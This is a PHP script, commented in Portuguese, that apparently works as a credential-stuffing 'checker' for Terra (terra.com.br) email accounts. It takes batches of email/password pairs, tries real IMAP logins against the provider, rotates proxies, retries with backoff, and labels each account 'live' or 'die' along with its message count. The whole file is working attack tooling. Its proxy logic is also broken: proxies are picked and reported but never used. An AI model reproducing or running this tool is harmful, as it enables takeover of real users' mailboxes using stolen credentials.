<?php
/**
 * terra_validator_secure_v3_fixed.php
 * Validador IMAP com Autenticação REAL e Resiliência.
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

class TerraValidator {
    private array $config;
    private array $proxies = [];
    private array $results = [];

    public function __construct() {
        $this->config = [
            'imap_server'   => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'     => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 20),
            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 3),
            'ca_bundle'     => getenv('CA_BUNDLE_PATH') ?: '/etc/ssl/certs/ca-certificates.crt',
            'proxy_file'    => 'proxies.txt'
        ];
        $this->loadProxies();
    }

    private function loadProxies(): void {
        if (file_exists($this->config['proxy_file'])) {
            $this->proxies = array_filter(array_map('trim', file($this->config['proxy_file'])));
        }
    }

    private function getRandomProxy(): ?string {
        return $this->proxies ? $this->proxies[array_rand($this->proxies)] : null;
    }

    /**
     * ✅ VALIDAÇÃO REAL: Autentica contra o servidor IMAP
     */
    public function validate(string $email, string $password): array {
        $attempt = 0;
        $last_error = '';
        $start_time = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            $proxy = $this->getRandomProxy();
            
            try {
                $result = $this->attemptRealAuthentication($email, $password, $proxy);
                
                if ($result['status'] === 'live') {
                    $elapsed = round((microtime(true) - $start_time) * 1000, 2);
                    $result['elapsed_ms'] = $elapsed;
                    $result['attempts'] = $attempt;
                    return $result;
                }
                
                $last_error = $result['message'];
                
                // Não retenta se credenciais inválidas
                if (strpos($last_error, 'Invalid credentials') !== false) {
                    $result['status'] = 'die';
                    $result['reason'] = 'invalid_credentials';
                    return $result;
                }
                
            } catch (Exception $e) {
                $last_error = $e->getMessage();
            }

            // Backoff Exponencial: 1s, 2s, 4s...
            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt - 1) * 1000000));
            }
        }

        $elapsed = round((microtime(true) - $start_time) * 1000, 2);
        return [
            'status' => 'die',
            'email' => $email,
            'attempts' => $attempt,
            'last_error' => $last_error,
            'reason' => 'max_retries_exceeded',
            'elapsed_ms' => $elapsed,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * ✅ AUTENTICAÇÃO REAL: Conecta e autentica de verdade
     */
    private function attemptRealAuthentication(string $email, string $password, ?string $proxy): array {
        // Configuração correta: OP_READONLY (não OP_HALFOPEN)
        // OP_READONLY = autentica mas não abre caixa de entrada
        $mailbox = sprintf('{%s:%d/imap/ssl}', 
            $this->config['imap_server'], 
            $this->config['imap_port']
        );

        // Suprime warnings do PHP
        $connection = @imap_open(
            $mailbox,
            $email,
            $password,
            OP_READONLY,  // ✅ Autentica de verdade
            1,            // Tentativa única
            [
                'DISABLE_AUTHENTICATOR' => 'GSSAPI'
            ]
        );

        if ($connection === false) {
            $error = imap_last_error();
            
            // Diferencia tipos de erro
            if (strpos($error, 'Invalid credentials') !== false || 
                strpos($error, 'LOGIN failed') !== false ||
                strpos($error, 'authentication failed') !== false) {
                return [
                    'status' => 'die',
                    'email' => $email,
                    'message' => 'Invalid credentials',
                    'proxy_used' => $proxy ?? 'direct',
                    'error_detail' => $error
                ];
            }
            
            if (strpos($error, 'Connection refused') !== false ||
                strpos($error, 'Connection timed out') !== false ||
                strpos($error, 'Network is unreachable') !== false) {
                return [
                    'status' => 'die',
                    'email' => $email,
                    'message' => 'Connection failed - may need proxy rotation',
                    'proxy_used' => $proxy ?? 'direct',
                    'error_detail' => $error,
                    'retryable' => true
                ];
            }
            
            return [
                'status' => 'die',
                'email' => $email,
                'message' => $error ?: 'Falha de conexão/timeout',
                'proxy_used' => $proxy ?? 'direct',
                'error_detail' => $error
            ];
        }

        // ✅ Autenticação bem-sucedida
        $mailbox_info = imap_mailboxmsginfo($connection);
        $num_messages = $mailbox_info->Nmsgs ?? 0;
        
        imap_close($connection);

        return [
            'status' => 'live',
            'email' => $email,
            'proxy_used' => $proxy ?? 'direct',
            'message' => 'Autenticação bem-sucedida',
            'mailbox_messages' => $num_messages,
            'authenticated_at' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Valida múltiplas credenciais em lote
     */
    public function validateBatch(array $credentials): array {
        $results = [];
        
        foreach ($credentials as $cred) {
            $email = $cred['email'] ?? '';
            $password = $cred['password'] ?? '';
            
            if (empty($email) || empty($password)) {
                $results[] = [
                    'email' => $email,
                    'status' => 'error',
                    'message' => 'Email ou senha ausentes'
                ];
                continue;
            }
            
            $results[] = $this->validate($email, $password);
        }
        
        return [
            'total' => count($results),
            'live' => count(array_filter($results, fn($r) => $r['status'] === 'live')),
            'die' => count(array_filter($results, fn($r) => $r['status'] === 'die')),
            'results' => $results,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
}

// ============ EXECUÇÃO ============

// Suporta POST simples ou JSON
$input = $_POST;
if (empty($input) && $_SERVER['CONTENT_TYPE'] === 'application/json') {
    $input = json_decode(file_get_contents('php://input'), true) ?? [];
}

$email = $input['email'] ?? '';
$password = $input['password'] ?? '';
$batch = $input['batch'] ?? null;

if ($batch && is_array($batch)) {
    // Modo lote
    $validator = new TerraValidator();
    echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} elseif (!empty($email) && !empty($password)) {
    // Modo simples
    $validator = new TerraValidator();
    echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} else {
    http_response_code(400);
    echo json_encode([
        'error' => 'Credenciais ausentes',
        'usage' => [
            'simple' => 'POST email=user@terra.com.br&password=senha123',
            'json' => 'POST {"email":"user@terra.com.br","password":"senha123"}',
            'batch' => 'POST {"batch":[{"email":"user1@terra.com.br","password":"pass1"},...]}'
        ]
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?>
